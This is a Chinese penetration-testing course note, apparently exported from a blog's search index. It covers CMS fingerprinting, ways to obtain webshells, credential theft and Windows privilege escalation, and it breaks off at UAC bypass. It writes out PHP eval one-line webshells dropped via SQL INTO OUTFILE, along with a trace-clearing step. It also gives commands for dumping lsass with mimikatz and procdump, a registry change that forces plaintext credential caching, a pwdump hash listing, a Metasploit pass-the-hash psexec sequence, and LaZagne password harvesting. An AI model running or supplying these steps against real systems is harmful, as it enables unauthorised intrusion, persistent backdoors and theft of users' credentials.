<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>老男孩--内网渗透(5)</title>
      <link href="/2025/05/12/oldboy5/"/>
      <url>/2025/05/12/oldboy5/</url>
      
        <content type="html"><![CDATA[<h1 id="获取webshell方法总结"><a href="#获取webshell方法总结" class="headerlink" title="获取webshell方法总结"></a>获取webshell方法总结</h1><h2 id="CMS获取webshell"><a href="#CMS获取webshell" class="headerlink" title="CMS获取webshell"></a>CMS获取webshell</h2><p>什么是CMS</p><p>​CMS系统指的是内容管理系统。已经有别人开发好了整个网站的前后端，使用者只需要部署cms，然后通过后台添加数据，修改图片等工作，就能搭建好一个的WEB系统。</p><p>如何搜寻CMS信息</p><p>​常见方法：[信息收集-CMS识别-CSDN博客](<a href="https://blog.csdn.net/m0_37856131/article/details/122924979#:~:text=%E5%88%B0%E6%82%A8%E8%A6%81%E6%A3%80%E6%9F%A5%E7%9A%84%E7%BD%91%E7%AB%99--%3E%E6%8C%89">https://blog.csdn.net/m0_37856131/article/details/122924979#:~:text=到您要检查的网站--&gt;按</a> Ctrl %2B U 显示页面代码—&gt;在 html 页面上找到前缀为meta name%3D”generator”content%3D的标签—&gt;引擎名称将在“内容”一词后用引号表示,js 文件路径的行中。 例如，wp-includes 和 wp-content 表明该网站由 Wordpress 提供支持)</p><h3 id="在线信息收集网站"><a href="#在线信息收集网站" class="headerlink" title="在线信息收集网站"></a>在线信息收集网站</h3><p>国内<br><a href="http://whatweb.bugscaner.com/">http://whatweb.bugscaner.com</a>        #识别CMS插件</p><p><a href="https://www.yunsee.cn/">https://www.yunsee.cn</a>                    #云悉CMS识别</p><p><a href="http://finger.tidesec.net/">http://finger.tidesec.net</a>                   #潮汐指纹识别</p><p><a href="https://www.godeye.vip/">https://www.godeye.vip</a>                  #WEB指纹识别</p><p>1.2：国外<br><a href="http://itrack.ru/whatcms">http://itrack.ru/whatcms</a>                 #CMS识别国外 （俄罗斯）</p><p><a href="https://builtwith.com/">https://builtwith.com</a>                      #全面的 CMS 检测</p><p><a href="https://sitereport.netcraft.com/">https://sitereport.netcraft.com</a>      #网站CMS识别</p><p><a href="https://cmsdetect.com/">https://cmsdetect.com</a>                  #CMS识别</p><p><a href="https://rescan.io/">https://rescan.io</a>                            #CMS列表识别</p><p><a href="https://scanwp.net/">https://scanwp.net</a>                        #包括插件也监测</p><p><a href="https://www.isitwp.com/">https://www.isitwp.com</a>                #专注WordPress识别</p><p><a href="https://www.codeinwp.com/find-out-what-wordpress-theme-is-that">https://www.codeinwp.com/find-out-what-wordpress-theme-is-that</a></p><h3 id="CMS识别工具"><a href="#CMS识别工具" class="headerlink" title="CMS识别工具"></a>CMS识别工具</h3><p>御剑WEB指纹识别</p><p>相关链接：<a href="http://www.xitongzhijia.net/soft/171203.html">http://www.xitongzhijia.net/soft/171203.html</a>  （文件自测）</p><p>TideFinger（潮汐）</p><p>项目地址：<a href="https://github.com/TideSec/TideFinger">https://github.com/TideSec/TideFinger</a></p><p>安装教程：<br>git clone <a href="https://github.com/TideSec/TideFinger.git">https://github.com/TideSec/TideFinger.git</a><br>cd TideFinger&#x2F;cd python3&#x2F; &amp;&amp; pip3 install -r requirements.txt  -i <a href="https://mirrors.aliyun.com/pypi/simple/">https://mirrors.aliyun.com/pypi/simple/</a></p><p>使用说明：<br>python3 TideFinger.py -u <a href="http://www.123.com/">http://www.123.com</a> [-p 1] [-m 50] [-t 5] [-d 0]<br>   -u: 待检测目标URL地址<br>   -p:指定该选项为1后，说明启用代理检测，请确保代理文件名为proxys_ips.txt,每行一条代理，格式如: 124.225.223.101:80<br>   -m: 指纹匹配的线程数，不指定时默认为50<br>   -t: 网站响应超时时间，默认为5秒<br>   -d: 是否启用目录匹配式指纹探测（会对目标站点发起大量请求），0为不启用，1为启用，默认为不启用</p><p>WhatWeb（kali自带）</p><p>项目地址：<a href="https://github.com/urbanadventurer/WhatWeb.git">https://github.com/urbanadventurer/WhatWeb.git</a></p><p>安装教程：<br>cd WhatWeb &amp;&amp; apt install ruby-bundler &amp;&amp;  bundle install &amp;&amp;</p><p>使用说明：<br>whatweb <a href="http://www.baidu.com/">www.baidu.com</a></p><p>大宝剑</p><p>项目地址：<a href="https://github.com/wgpsec/DBJ">https://github.com/wgpsec/DBJ</a></p><p>多CMS识别工具<br>项目地址：<a href="https://github.com/Tuhinshubhra/CMSeek">https://github.com/Tuhinshubhra/CMSeek</a></p><h3 id="其他识别CMS方法"><a href="#其他识别CMS方法" class="headerlink" title="其他识别CMS方法"></a>其他识别CMS方法</h3><p><strong>CMS识别指纹(浏览器插件)</strong><br>WhatRuns</p><p>Wappalyzer</p><p><strong>F12代码JS文件</strong><br>    如果有不知道CMS的网站，可以F12查看网站源代码的JS、CSS等文件，找特殊字符，然后去Github或者红迪（Reddit）网去搜索找到的字符。</p><p><strong>CMS的名称在页面的源代码中指定</strong><br>    到您要检查的网站–&gt;按 Ctrl + U 显示页面代码—&gt;在 html 页面上找到前缀为meta name&#x3D;”generator”content&#x3D;的标签—&gt;引擎名称将在“内容”一词后用引号表示</p><p><strong>文件路径</strong><br>    CMS 可以通过代码的典型文件夹及其结构来识别。特别是在指示 js 文件路径的行中。例如，wp-includes 和 wp-content 表明该网站由 Wordpress 提供支持</p><p><strong>网站页脚中的指示</strong><br>    CMS 名称有时可以在页脚、底部的小字体、联系信息或额外的公司信息下找到</p><p><strong>链接结构分析</strong><br>    如果网站页面的 URL 是在没有使用 CNC 生成器的情况下形成的，您会注意到页面文本中特定于特定 CMS 的部分。</p><p>WordPress 和 Joomla 的特定信息的链接可以在下面的示例中看到</p><p>WordPress：website_name&#x2F;р&#x3D;123</p><p>Joomla：website_name&#x2F;index.php?option&#x3D;com_content&amp;</p><p>task&#x3D;view&amp;id&#x3D;12&amp;Itemid&#x3D;345website_name&#x2F;content&#x2F;view&#x2F;12&#x2F;345&#x2F;</p><p><strong>管理员登录网址</strong><br>    上使用的 CMS 可以通过查看指向网站管理面板的 URL 来确定。这是 WordPress，例如，如果将 &#x2F;wp-admin&#x2F; 添加到 URL 栏中的域名，则会将您带到带有登录名和密码输入窗口的页面。</p><p>site_name&#x2F;wp-admin&#x2F; - WordPress</p><p>site_name&#x2F;administrator&#x2F; - Joomla</p><p>site_name&#x2F;admin&#x2F; - OpenCart</p><p>SiteName&#x2F;user&#x2F; - Drupal</p><p><strong>网站特有文件</strong><br>    如&#x2F;templets&#x2F;default&#x2F;style&#x2F;dedecms.css—dedecms</p><p><strong>网站MD5指纹</strong><br>    一些网站的特定图片文件、js文件、CSS等静态文件，如favicon.ico、css、logo.ico、js等文件一般不会修改，通过爬虫对这些文件进行抓取并比对md5值，如果和规则库中的Md5一致则说明是同一CMS。这种方式速度比较快，误报率相对低一些，但也不排除有些二次开发的CMS会修改这些文件。</p><p><strong>一些汇总</strong><br>    网站文件命名规则</p><p>​返回头的关键字</p><p>​网页关键字</p><p>​Url特征</p><p>​Meta特征</p><p>​Script特征</p><p>​robots.txt</p><p>​网站路径特征</p><h3 id="CMS漏洞检测工具"><a href="#CMS漏洞检测工具" class="headerlink" title="CMS漏洞检测工具"></a>CMS漏洞检测工具</h3><p><strong>wordpress</strong><br>项目地址：<a href="https://github.com/rastating/wordpress-exploit-framework">https://github.com/rastating/wordpress-exploit-framework</a></p><p>项目地址：<a href="https://github.com/n00py/WPForce">https://github.com/n00py/WPForce</a></p><p>项目地址：<a href="https://github.com/wpscanteam/wpscan">https://github.com/wpscanteam/wpscan</a></p><p>描述 ：WPScan WordPress 安全扫描器</p><p>使用：kali–&gt;wpscan –url “目标网站”</p><p><strong>Drupal</strong><br>项目地址：<a href="https://github.com/SamJoan/droopescan">https://github.com/SamJoan/droopescan</a><br>项目地址：<a href="https://github.com/immunIT/drupwn">https://github.com/immunIT/drupwn</a></p><p>安装教程：<br>git clone <a href="https://github.com/immunIT/drupwn.git">https://github.com/immunIT/drupwn.git</a> &amp;&amp; cd drupwn<br>pip3 install -r requirements.txt </p><p>使用说明：.&#x2F;drupwn –mode enum –target “目标地址”<br>  –mode MODE     模式枚举|利用<br>  –target TARGET   要扫描的目标主机名</p><p><strong>Joomla</strong><br>项目地址：<a href="https://github.com/OWASP/joomscan">https://github.com/OWASP/joomscan</a></p><p>描述：OWASP Joomla 漏洞扫描程序项目</p><p>安装教程：kali–&gt;apt install joomscan</p><p>使用：joomscan -u “目标”</p><p><strong>cmseek</strong><br>项目地址：<a href="https://github.com/Tuhinshubhra/CMSeeK">https://github.com/Tuhinshubhra/CMSeeK</a></p><p>安装教程：</p><p>git clone <a href="https://github.com/Tuhinshubhra/CMSeeK">https://github.com/Tuhinshubhra/CMSeeK</a> &amp;&amp; cd CMSeeK</p><p>pip3 install -r requirements.txt</p><p>使用说明：python3 cmseek.py -u “目标地址”  </p><p>#######以上三款工具都可kali安装#########</p><p><strong>几个在线CMS漏洞扫描网站</strong><br><a href="https://wpsec.com/">https://wpsec.com/</a>                                                          #wordpress专业扫描</p><p><a href="https://wpscan.com/">https://wpscan.com/</a>                                                        #wordpress专业扫描</p><p><a href="https://www.malcare.com/wordpress-malware-scan/">https://www.malcare.com/wordpress-malware-scan/</a>     #wordpress专业扫描</p><p><a href="https://hackertarget.com/scan-membership/">https://hackertarget.com/scan-membership/</a>                 #通用-收费</p><p><a href="https://gf.dev/">https://gf.dev/</a>                                                                  #综合测试</p><p><a href="https://pentest-tools.com/">https://pentest-tools.com/</a>                                              #2次免费扫描</p><p><a href="https://www.automox.com/">https://www.automox.com/</a>        </p><p>相关参考链接：</p><p><a href="https://zhuanlan.zhihu.com/p/355150689">https://zhuanlan.zhihu.com/p/355150689</a></p><p><a href="https://zhuanlan.zhihu.com/p/402320861">https://zhuanlan.zhihu.com/p/402320861</a></p><p><a href="https://www.cnblogs.com/qingchengzi/articles/13533704.html">https://www.cnblogs.com/qingchengzi/articles/13533704.html</a></p><h2 id="非CMS获取webshell"><a href="#非CMS获取webshell" class="headerlink" title="非CMS获取webshell"></a>非CMS获取webshell</h2><p>更多的时候企业并不使用开源的CMS，而是选择自己开发源代码，这里的思路分为有权限和无权限两方面来分析</p><h3 id="有管理权限的情况："><a href="#有管理权限的情况：" class="headerlink" title="有管理权限的情况："></a>有管理权限的情况：</h3><p>是指前期通过其他方法，已经破解了管理后台功能，可以使用管理后台的情况</p><h4 id="通过正常上传一句话小马获取webshell"><a href="#通过正常上传一句话小马获取webshell" class="headerlink" title="通过正常上传一句话小马获取webshell"></a><strong>通过正常上传一句话小马获取webshell</strong></h4><ol><li>检查网站是否过滤上传文件后缀格式，如果未过滤直接上传一句话小马即可。</li><li>找到网站默认配置，将一句话小马插入配置中<br>因为有些网站没有对配置参数进行过滤，所以配置中的小马被读取后，就可能被连接</li></ol><p>建议先下载该站源码，进行查看源码过滤规则，以防插马失败。<br>插马失败很有可能会导致网站被你的小马中没有闭合标签导致网站出错。注意要闭合原有的代码，保证语法正确，以免程序运行出错。</p><h4 id="利用后台数据库备份获取webshell"><a href="#利用后台数据库备份获取webshell" class="headerlink" title="利用后台数据库备份获取webshell"></a><strong>利用后台数据库备份获取webshell</strong></h4><p>一般网站都不允许上传脚本类型文件，如 asp、php、jsp、aspx等文件。但一般后台都会有数据库备份功能。步骤如下</p><ol><li>上传允许格式的小马(如图片马)</li><li>找到文件上传后的文件路径</li><li>通过数据库备份，指定备份源文件与与备份后格式。</li></ol><p>如果后台限制了备份路径，可以尝试F12修改文本框元素</p><h4 id="通过花样上传一句话小马获取Webshell"><a href="#通过花样上传一句话小马获取Webshell" class="headerlink" title="通过花样上传一句话小马获取Webshell"></a>通过花样上传一句话小马获取Webshell</h4><p>使用BurpSuite 工具，%00截断、特殊名文件名绕过、文件名大小写绕过、黑白名单绕过等等，想尽一切办法就是要上传一句话木马，通过各种变形，万变不离其宗，换汤不换药。</p><h4 id="通过编辑模块、标签等拿WebShell"><a href="#通过编辑模块、标签等拿WebShell" class="headerlink" title="通过编辑模块、标签等拿WebShell"></a>通过编辑模块、标签等拿WebShell</h4><p>①通过对网站的<strong>模块</strong>进行编辑写入一句话，然后生成脚本文件拿WebShell</p><p>②通过将木马添加到压缩文件，把名字改为<strong>网站模板类型</strong>，上传到网站服务器，拿WebShell</p><h4 id="SQL命令获取"><a href="#SQL命令获取" class="headerlink" title="SQL命令获取"></a>SQL命令获取</h4><p>有一定的数据库权限的情况下，通过向数据库表写入马，然后备份该表为脚本文件的方式进行<br><strong>大致步骤：</strong></p><ol><li>创建表</li><li>将一句话写入刚创建的表中</li><li>查询一句话所在表到文件，成功将一句话写入文件</li></ol><p>第一种方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE `mysql`.`best` (`best1` TEXT NOT NULL );  </span><br><span class="line">#将一句话木马插入到mysql库best表best1字段</span><br><span class="line">INSERT INTO `mysql`.`best` (`best1` ) VALUES (&#x27;&lt;?php @eval($_POST[password]);?&gt;&#x27;);</span><br><span class="line">#查询这个字段导出到网站的文件中</span><br><span class="line">SELECT `best1` FROM `best` INTO OUTFILE &#x27;d:/wamp/www/best.php&#x27;;</span><br><span class="line">#把痕迹清除</span><br><span class="line">DROP TABLE IF EXISTS `best`;</span><br></pre></td></tr></table></figure><p>第二种方法：<br>优先推荐，简单明了，且避免了误删别人的数据！</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#直接将查询出来的语句写入文件</span><br><span class="line">select &#x27;&lt;?php @eval($_POST[pass]);?&gt;&#x27;INTO OUTFILE &#x27;d:/wamp/www/best3.php&#x27;</span><br></pre></td></tr></table></figure><h4 id="利用解析漏洞拿WebShell"><a href="#利用解析漏洞拿WebShell" class="headerlink" title="利用解析漏洞拿WebShell"></a>利用解析漏洞拿WebShell</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1）IIS5.x / 6.0 解析漏洞</span><br><span class="line">2）IIS 7.0 / IIS 7.5 / Nginx &lt;8.03 畸形解析漏洞</span><br><span class="line">3）Nginx &lt; 8.03 空字节代码执行漏洞</span><br><span class="line">4）Apache 解析漏洞</span><br></pre></td></tr></table></figure><p>其他的还有命令执行漏洞，反序列化漏洞等</p><h4 id="利用编辑器漏洞拿WebShell"><a href="#利用编辑器漏洞拿WebShell" class="headerlink" title="利用编辑器漏洞拿WebShell"></a>利用编辑器漏洞拿WebShell</h4><p>利用网站的编辑器上传木马，搜索已知的编辑器漏洞，常见的编辑器有 fckeditor、ewebeditor、cheditor等，有时候没有管理员权限也可以拿下webshell。</p><h4 id="文件包含拿WebShell"><a href="#文件包含拿WebShell" class="headerlink" title="文件包含拿WebShell"></a>文件包含拿WebShell</h4><ol><li>首先需要存在文件包含漏洞</li><li>先将WebShell 改为txt格式文件上传</li><li>然后上传一个脚本文件包含该txt格式文件</li><li>通过这种方式，可绕过WAF拿WebShell</li></ol><h4 id="上传其它脚本类型拿WebShell"><a href="#上传其它脚本类型拿WebShell" class="headerlink" title="上传其它脚本类型拿WebShell"></a>上传其它脚本类型拿WebShell</h4><ol><li>此类型用于一台服务器具有多个网站<br>a网站是asp的站，b可能是php的站，分别限制了asp和php文件的上传，可以尝试向A上传php的脚本，来拿Shell</li><li>也可以尝试将脚本文件后缀名改为asa 或者在后面直接加个点（.）如”xx.asp.”， 来突破文件类型限制进行上传拿WebShell</li></ol><h4 id="修改网站上传类型配置来拿WebShell"><a href="#修改网站上传类型配置来拿WebShell" class="headerlink" title="修改网站上传类型配置来拿WebShell"></a>修改网站上传类型配置来拿WebShell</h4><p>某些网站，在网站上传类型中限制了上传脚本类型文件，我们可以去添加上传文件类型如添加asp | php | jsp | aspx | asa 后缀名来拿WebShell</p><h3 id="非管理权限"><a href="#非管理权限" class="headerlink" title="非管理权限"></a>非管理权限</h3><hr><h4 id="SQL注入漏洞"><a href="#SQL注入漏洞" class="headerlink" title="SQL注入漏洞"></a>SQL注入漏洞</h4><p>前提条件，具有足够权限，对写入木马的文件夹有写入权限，知道网站绝对路径</p><p>①可以通过log 备份、差异备份拿WebShell<br>②可以通过<code>into outfile</code>,<code>into outfile</code>函数(写入函数)将一句话木马写入，拿WebShell。<br>③利用phpmyadmin 将木马导出，拿WebShell<br>④利用连接外连的数据库拿WebShell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1. 要有file_priv权限</span><br><span class="line">2. 知道文件绝对路径 </span><br><span class="line">3. 能使用union </span><br><span class="line">4. 对web目录有读权限</span><br><span class="line">5. 若过滤了单引号，则可以将函数中的字符进行hex编码 </span><br></pre></td></tr></table></figure><h4 id="xss和sql注入联合利用"><a href="#xss和sql注入联合利用" class="headerlink" title="xss和sql注入联合利用"></a>xss和sql注入联合利用</h4><p>有些输入框对一些符号过滤不严密（如&lt;&gt;，所以一般存在xss的地方就可以这么利用）我们可以在这里输入一句话<code>&lt;?php @eval($_POST[&#39;CE&#39;]);?&gt;</code>，之后再用数据库注入，查询到文件into file成功插入一句话木马</p><h4 id="IIS写权限拿WebShell"><a href="#IIS写权限拿WebShell" class="headerlink" title="IIS写权限拿WebShell"></a>IIS写权限拿WebShell</h4><p>有些网站的管理员在配置网站权限的时候疏忽，导致我们有写权限，这种漏洞需要用工具来利用，已经很少见了，有专门的利用工具（桂林老兵）。<br>原理是通过找到有IIS 写入权限的网站（开启WebDeV），PUT进去一个.txt 格式的文件，目录必须有刻写的权限，如 image 文件夹，然后通过move 方法，把txt 格式的木马用move 成脚本格式。</p><h4 id="远程命令执行拿WebShell"><a href="#远程命令执行拿WebShell" class="headerlink" title="远程命令执行拿WebShell"></a>远程命令执行拿WebShell</h4><p>在有php代码执行漏洞,例如一些框架漏洞的时候可以通过执行一些系统命令进行拿WebShell。执行命令行命令“写入如下内容到文件，会自动将创建木马文件并将一句话木马写入其中，使用菜刀连接即可。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo ?php &quot;@eval($_POST[&#x27;CE&#x27;]);?&gt;&quot; &gt; x.php </span><br></pre></td></tr></table></figure><h4 id="头像上传拿WebShell"><a href="#头像上传拿WebShell" class="headerlink" title="头像上传拿WebShell"></a>头像上传拿WebShell</h4><p>大概思路：<br>①将大马放在文件夹中<br>②将文件夹压缩成压缩文件（zip）<br>③正常上传一个头像并且抓包<br>④将数据包中图片头像的内容部分删掉<br>⑤重新写入文件内容，将压缩文件写入到原本图片的位置<br>⑥上传，之后返回包中会告诉我们绝对路径</p><h1 id="管理员密码提取"><a href="#管理员密码提取" class="headerlink" title="管理员密码提取"></a>管理员密码提取</h1><p><strong>需要以管理员用户登录，才能提取密码</strong></p><h2 id="mimikatz工具读取"><a href="#mimikatz工具读取" class="headerlink" title="mimikatz工具读取"></a>mimikatz工具读取</h2><p>当目标为WindowsXP-2012等操作系统时，通过以下命令可以直接提取到明文密码（需要以管理员身份登录）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpassWords&quot; exit&gt;123.txt</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">提升权限</span></span><br><span class="line">privilege::debug</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>当目标为win10或2012R2以上时，默认在内存缓存中禁止保存明文密码，但可以通过修改注册表的方式抓取明文（可能出现问题）</p><p>1、修改注册表，让Wdigest Auth 保存明文口令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f</span><br></pre></td></tr></table></figure><p>2、重启或注销登录，导出lsass.dmp</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">procdump64.exe -accepteula -ma lsass.exe lsass.dmp</span><br></pre></td></tr></table></figure><p>3、然后拿到 mimikatz 文件夹执行命令读明文</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sekurlsa::minidump lsass.dmp</span><br><span class="line">sekurlsa::logonPasswords full</span><br></pre></td></tr></table></figure><h2 id="本地hash远程攻击"><a href="#本地hash远程攻击" class="headerlink" title="本地hash远程攻击"></a>本地hash远程攻击</h2><p>1、获取sam文件中administrator的hash密码</p><p>使用pwdump工具获取密码</p><p>​<a href="https://www.openwall.com/passwords/windows-pwdump">Windows PWDUMP tools</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">C:\Documents and Settings\Administrator\桌面\pwdump8-8.2\pwdump7&gt;PwDump7.exe</span><br><span class="line">Pwdump v7.1 - raw password extractor</span><br><span class="line">Author: Andres Tarasco Acuna</span><br><span class="line">url: http://www.514.es</span><br><span class="line"></span><br><span class="line">Administrator:500:44EFCE164AB921CAAAD3B435B51404EE:32ED87BDB5FDC5E9CBA8854737681</span><br><span class="line">8D4:::</span><br><span class="line">Guest:501:NO PASSWORD*********************:NO PASSWORD*********************:::</span><br><span class="line">SUPPORT_388945a0:1001:NO PASSWORD*********************:B7BF2AD63C27101B314C28578</span><br><span class="line">FE3F1B9:::</span><br><span class="line">IUSR_GOLD-DFD1EF44BA:1003:587598BDB5B2EA09B2D2D1539A5CC67F:5C79A5D27C799E4E033C3</span><br><span class="line">96BDCEBD0ED:::</span><br><span class="line">IWAM_GOLD-DFD1EF44BA:1004:5858D28D62B2A756E9B758B2D3F45F97:1ABB238FC5AD200853D15</span><br><span class="line">FDC99B14207:::</span><br><span class="line">ASPNET:1006:CEBCC37474AA8AD3248733E5E96EA6DC:6D3A0F8AC892872D72EBFFD510F4BBEF:::</span><br><span class="line"></span><br><span class="line">test:1015:01FC5A6BE7BC6929AAD3B435B51404EE:0CB6948805F797BF2A82807973B89537:::</span><br><span class="line"></span><br><span class="line">C:\Documents and Settings\Administrator\桌面\pwdump8-8.2\pwdump7&gt;</span><br></pre></td></tr></table></figure><p>2、利用msf提供的exploit&#x2F;windows&#x2F;smb&#x2F;psexec模块</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msf &gt;use exploit/windows/smb/psexec</span><br><span class="line">msf &gt;set RHOST 192.168.1.109</span><br><span class="line">msf &gt;set SMBUser administrator</span><br><span class="line">msf &gt;set SMBPass 44EFCE164AB921CAAAD3B435B51404EE:32ED87BDB5FDC5E9CBA8854737681</span><br><span class="line">8D4</span><br><span class="line">msf &gt;exploit</span><br><span class="line">msf &gt;shell</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="使用LaZagne"><a href="#使用LaZagne" class="headerlink" title="使用LaZagne"></a>使用LaZagne</h2><p>强烈推荐：可以获取所有的密码：浏览器密码、wifi密码等信息</p><p>[LaZagne][(<a href="https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.6/LaZagne.exe)]">https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.6/LaZagne.exe)]</a></p><p>1、安装依赖</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install -r requirements.txt</span><br></pre></td></tr></table></figure><p>2、基本使用</p><p>​</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">抓取所有支持软件的密码</span></span><br><span class="line">laZagne.exe all</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">抓取浏览器的密码：</span></span><br><span class="line">laZagne.exe browsers</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">把所有的密码写入一个文件：</span></span><br><span class="line">laZagne.exe all -oN -output D:\BaiduNetdiskDownload\LaZagne-master\LaZagne-master</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">解密域凭据（要解密域凭据，可以通过指定用户 Windows 密码的方式来完成。）：</span></span><br><span class="line">laZagne.exe all -password ZapataVive</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="Windows系统提权"><a href="#Windows系统提权" class="headerlink" title="Windows系统提权"></a>Windows系统提权</h1><h2 id="提权知识储备"><a href="#提权知识储备" class="headerlink" title="提权知识储备"></a>提权知识储备</h2><h3 id="常见提权方法"><a href="#常见提权方法" class="headerlink" title="常见提权方法"></a>常见提权方法</h3><blockquote><p>1、 溢出漏洞提权<br>2、 数据库提权<br>3、 第三方软件提权</p></blockquote><h3 id="Cmd命令无法执行原因分析"><a href="#Cmd命令无法执行原因分析" class="headerlink" title="Cmd命令无法执行原因分析"></a>Cmd命令无法执行原因分析</h3><p>有时通过webshell连接上操作系统后，cmd命令可能无法执行，原因一般都是被管理员降权或删除、组件被删除。<br>解决方法是通过脚本木马查找可读可写目录，上传cmd.exe，调用设定cmd路径（找可读可写目录不要选带空格目录）。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#设置cmd执行路径</span><br><span class="line">setp c:\xxx\vvv\cmd.exe</span><br></pre></td></tr></table></figure><h3 id="提权常用命令讲解"><a href="#提权常用命令讲解" class="headerlink" title="提权常用命令讲解"></a>提权常用命令讲解</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">whoami ——查看用户权限</span><br><span class="line">systeminfo ——查看操作系统，补丁情况</span><br><span class="line">ipconfig——查看当前服务器IP ipconfig /all</span><br><span class="line">net user——查看当前用户情况</span><br><span class="line">netstat ——查看当前网络连接情况  </span><br><span class="line">netstat –ano  /netstat –an | find “ESTABLISHED”</span><br><span class="line">tasklist ——查看当前进程情况 tasklist /svc</span><br><span class="line">taskkill ——结束进程 taskkill -PID xx</span><br><span class="line">net start  ——启动服务</span><br><span class="line">net stop ——停止服务</span><br><span class="line">hostname ——获取主机名称</span><br><span class="line">quser or query user ——获取在线用户</span><br><span class="line">netstat -ano | findstr 3389 ——获取rdp连接来源IP</span><br><span class="line">dir c:\programdata\ ——分析安装杀软</span><br><span class="line">wmic qfe get Caption,Description,HotFixID,InstalledOn ——列出已安装的补丁</span><br><span class="line">REG query HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server\WinStations\RDP-Tcp /v PortNumber ——获取远程端口</span><br><span class="line">tasklist /svc | find &quot;TermService&quot; + netstat -ano ——获取远程端口</span><br></pre></td></tr></table></figure><h2 id="系统溢出漏洞提权实战"><a href="#系统溢出漏洞提权实战" class="headerlink" title="系统溢出漏洞提权实战"></a>系统溢出漏洞提权实战</h2><h3 id="零、系统溢出漏洞提权分类："><a href="#零、系统溢出漏洞提权分类：" class="headerlink" title="零、系统溢出漏洞提权分类："></a><strong>零、系统溢出漏洞提权分类：</strong></h3><ol><li>远程溢出<br>攻击者只需要与服务器建立连接，然后根据系统的漏洞，使用相应的溢出程序，即可获取到远程服务器的root权限。</li><li>本地溢出<br>首先要有服务器的一个用户，且需要有执行的权限的用户才能发起提权，<br>攻击者通常会向服务器上传本地溢出程序，在服务器端执行，如果系统存在漏洞，那么将溢出root权限</li></ol><h3 id="一、UAC绕过提权"><a href="#一、UAC绕过提权" class="headerlink" title="一、UAC绕过提权"></a>一、UAC绕过提权</h3><p>UAC（User Account Control）是微软在 Windows Vista 以后版本引入的一种安全机制，通过 UAC，应用程序和任务可始终在非管理员帐户的安全上下文中运行，除非管理员特别授予管理员级别的系统访问权限。<br>当获得的权限是属于管理员组的时候但是并不是administrator这个用户，此时就可能需要我们进行绕过UAC的操作，否则虽然是管理员组但是实际上并没有管理员所对应的高权限操作,这个时候就需要bypass uac。</p><p><strong>uac 